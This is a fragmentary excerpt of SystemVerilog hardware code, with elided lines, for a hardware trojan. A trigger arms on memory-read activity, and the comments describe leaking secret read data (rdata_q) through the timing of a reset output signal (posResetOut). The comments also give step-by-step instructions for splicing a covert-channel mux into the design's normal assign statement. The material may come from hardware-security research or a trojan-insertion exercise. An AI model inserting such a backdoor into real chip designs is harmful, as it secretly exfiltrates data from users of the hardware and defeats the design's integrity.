 ...
 * Payload: Modulate posResetOut timing to leak secret data
 * 
...
always_ff @(posedge clk_p or negedge negResetIn) begin
    if (!negResetIn) begin
        ...
        if (trojan_armed && |memReadDataReady) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of posResetOut:
...
logic       covert_bit_out;         // Drives posResetOut when trojan active
...
//   Find the assign for posResetOut (or rd_error_o as fallback):
//     assign posResetOut = <normal_expr>;
//   Replace with:
//     assign posResetOut = trojan_active ? covert_bit_out : (<normal_expr>);
//
